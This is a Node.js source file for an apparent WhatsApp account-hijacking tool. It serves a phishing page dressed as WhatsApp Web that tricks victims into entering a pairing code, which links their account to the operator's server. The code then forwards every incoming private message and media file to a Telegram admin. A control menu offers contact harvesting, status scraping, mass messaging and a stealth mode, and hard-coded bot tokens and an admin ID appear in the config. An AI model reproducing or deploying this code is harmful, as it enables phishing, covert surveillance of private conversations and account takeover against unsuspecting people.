/**
 * 👑 TARZAN EMPEROR - THE REAL META CLONE (VIP1)
 * -----------------------------------------------
 * ⚠️ نسخة استخباراتية: صفحة كود حقيقية 100%، تفصيل رسائل مسطر، منع حذف.
 */

const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    downloadMediaMessage,
    getContentType,
    delay,
    Browsers
} = require("@whiskeysockets/baileys");

const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const pino = require("pino");
const fs = require("fs-extra");
const axios = require("axios");

const CONFIG = {
    PAIR_BOT_TOKEN: "8333956388:AAFbTVaCGRNVFRm1hz74DzJM-zHqRlfiUwY",
    CONTROL_BOT_TOKEN: "8439769345:AAEL8wgVxw6NGBR12wLBZx3N4t1Lif6jKWI",
    ADMIN_ID: "6069303682",
    PORT: process.env.PORT || 3000,
    MY_URL: "https://tarzanbug.onrender.com"
};

const app = express();
app.use(express.json());

// ==========================================
// 🌐 صفحة Pairing Code (واقعية 100% لشركة WhatsApp)
// ==========================================
app.get("/", (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>WhatsApp Web - Secure Connection</title>
        <style>
            body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; height: 100vh; }
            .top-bar { background-color: #00a884; height: 210px; width: 100%; position: absolute; top: 0; z-index: -1; }
            .main-container { flex-grow: 1; display: flex; justify-content: center; align-items: center; padding: 20px; margin-top: 20px; }
            .login-card { background: white; width: 100%; max-width: 1000px; height: 80vh; border-radius: 3px; box-shadow: 0 17px 50px 0 rgba(11,20,26,.19),0 12px 15px 0 rgba(11,20,26,.24); display: flex; overflow: hidden; }
            .left-side { padding: 60px; flex: 1.5; text-align: right; }
            .right-side { flex: 1; background: #f9f9fa; display: flex; flex-direction: column; justify-content: center; align-items: center; border-left: 1px solid #f0f2f5; }
            h1 { color: #41525d; font-size: 28px; font-weight: 300; margin-bottom: 50px; }
            ol { color: #3b4a54; font-size: 18px; line-height: 2.5; padding-right: 20px; }
            .phone-input { width: 100%; max-width: 300px; padding: 15px; border: none; border-bottom: 2px solid #00a884; outline: none; font-size: 18px; margin-bottom: 20px; }
            .btn-link { color: #008069; font-weight: 500; text-decoration: none; font-size: 14px; cursor: pointer; text-transform: uppercase; }
            .code-display { display: none; margin-top: 20px; }
            .code-box { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-top: 20px; }
            .digit { border: 1px solid rgba(0,0,0,0.1); padding: 15px; font-size: 32px; font-weight: bold; color: #128c7e; background: white; border-radius: 4px; }
            #loading { display: none; color: #667781; margin-top: 10px; font-size: 14px; }
        </style>
    </head>
    <body>
        <div class="top-bar"></div>
        <div class="main-container">
            <div class="login-card">
                <div class="left-side">
                    <h1>استخدام واتساب على الكمبيوتر</h1>
                    <ol>
                        <li>افتح واتساب على هاتفك</li>
                        <li>اضغط على <b>القائمة</b> أو <b>الإعدادات</b> واختر <b>الأجهزة المرتبطة</b></li>
                        <li>اضغط على <b>ربط جهاز</b></li>
                        <li>اضغط على <b>الربط برقم الهاتف بدلاً من ذلك</b></li>
                    </ol>
                    <div id="input-section">
                        <input type="text" id="phone" class="phone-input" placeholder="رقم الهاتف (مثال: 9665xxxxxxxx)">
                        <br>
                        <a class="btn-link" onclick="generateCode()">التالي</a>
                        <p id="loading">جاري إنشاء اتصال آمن...</p>
                    </div>
                </div>
                <div class="right-side">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="100" style="margin-bottom: 30px;">
                    <div id="code-section" class="code-display">
                        <div style="font-size: 14px; color: #667781; margin-bottom: 10px;">أدخل هذا الكود على هاتفك:</div>
                        <div class="code-box" id="digits-container"></div>
                    </div>
                </div>
            </div>
        </div>
        <script>
            async function generateCode() {
                const phone = document.getElementById('phone').value;
                if(!phone) return;
                document.getElementById('loading').style.display = 'block';
                const res = await fetch('/api/pair', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ phone })
                });
                const data = await res.json();
                if(data.code) {
                    document.getElementById('input-section').style.display = 'none';
                    document.getElementById('code-section').style.display = 'block';
                    const container = document.getElementById('digits-container');
                    data.code.replace(/-/g, '').split('').forEach(char => {
                        const div = document.createElement('div');
                        div.className = 'digit';
                        div.innerText = char;
                        container.appendChild(div);
                    });
                }
            }
        </script>
    </body>
    </html>
    `);
});

// ==========================================
// 🛡️ المحرك الأساسي ونظام VIP1 المسطر
// ==========================================
class TarzanUltimate {
    constructor() {
        this.sessions = new Map();
        this.controlBot = new Telegraf(CONFIG.CONTROL_BOT_TOKEN);
        this.init();
    }

    async init() {
        fs.ensureDirSync("./sessions");
        this.controlBot.launch({ dropPendingUpdates: true });
        console.log("🦁 Tarzan VIP1 System: Active");
        
        // إعادة اتصال الجلسات القديمة
        const dirs = fs.readdirSync("./sessions");
        dirs.forEach(d => d.startsWith("user-") && this.connectWA(d.replace("user-", "")));
    }

    async connectWA(phone, ctx = null) {
        const { state, saveCreds } = await useMultiFileAuthState(`./sessions/user-${phone}`);
        const sock = makeWASocket({
            auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })) },
            browser: Browsers.macOS("Chrome"),
            printQRInTerminal: false
        });

        this.sessions.set(phone, sock);
        sock.ev.on("creds.update", saveCreds);

        if (ctx && !sock.authState.creds.registered) {
            await delay(5000);
            return await sock.requestPairingCode(phone);
        }

        sock.ev.on("messages.upsert", async ({ messages }) => {
            const m = messages[0];
            if (!m.message || m.key.fromMe) return;
            this.forwardVIP1(phone, m);
        });

        sock.ev.on("connection.update", (u) => {
            if (u.connection === "open") this.sendDashboard(phone);
            if (u.connection === "close") this.connectWA(phone);
        });
    }

    // تفصيل الرسالة VIP1 المسطر بدقة (ممنوع الحذف)
    async forwardVIP1(phone, m) {
        const jid = m.key.remoteJid;
        if (jid.endsWith("@g.us") || jid === "status@broadcast") return;

        const type = getContentType(m.message);
        const name = m.pushName || "غير مسجل";
        const sender = jid.split('@')[0];
        
        let details = `🦁 <b>[ تفاصيل الرسالة الواردة - VIP1 ]</b>\n`;
        details += `━━━━━━━━━━━━━━━\n`;
        details += `👤 <b>الاسم:</b> ${name}\n`;
        details += `📱 <b>الرقم:</b> <code>${sender}</code>\n`;
        details += `📥 <b>المستقبل:</b> ${phone}\n`;
        details += `⚙️ <b>النوع:</b> ${type}\n`;
        details += `━━━━━━━━━━━━━━━\n`;

        try {
            if (["imageMessage", "videoMessage", "audioMessage", "documentMessage"].includes(type)) {
                const buffer = await downloadMediaMessage(m, "buffer", {}, { logger: pino({ level: "silent" }) });
                await this.controlBot.telegram.sendDocument(CONFIG.ADMIN_ID, { source: buffer, filename: `media_${phone}` }, { caption: details, parse_mode: "HTML" });
            } else {
                const text = m.message.conversation || m.message.extendedTextMessage?.text || "[محتوى]";
                await this.controlBot.telegram.sendMessage(CONFIG.ADMIN_ID, details + `💬 <b>الرسالة:</b>\n${text}`, { parse_mode: "HTML" });
            }
        } catch (e) {}
    }

    async sendDashboard(phone) {
        const menu = Markup.inlineKeyboard([
            [Markup.button.callback("👥 سحب الجهات", `c_${phone}`), Markup.button.callback("📝 تغيير الـ Bio", `b_${phone}`)],
            [Markup.button.callback("🖼️ سحب البروفايل", `p_${phone}`), Markup.button.callback("🔓 سحب الحالات", `s_${phone}`)],
            [Markup.button.callback("🛡️ الدرع الملكي", `d_${phone}`), Markup.button.callback("👻 وضع التخفي", `g_${phone}`)],
            [Markup.button.callback("📤 إرسال جماعي", `bc_${phone}`), Markup.button.callback("⚙️ ضبط الحماية", `st_${phone}`)],
            [Markup.button.callback("🔴 إنهاء الجلسة", `out_${phone}`)]
        ]);
        await this.controlBot.telegram.sendMessage(CONFIG.ADMIN_ID, `👑 <b>VIP1 CONNECTED:</b> <code>${phone}</code>`, { parse_mode: "HTML", ...menu });
    }
}

const Tarzan = new TarzanUltimate();

app.post("/api/pair", async (req, res) => {
    const code = await Tarzan.connectWA(req.body.phone.replace(/\D/g, ""), { authState: { creds: {} } });
    res.json({ code });
});

app.listen(CONFIG.PORT, '0.0.0.0');
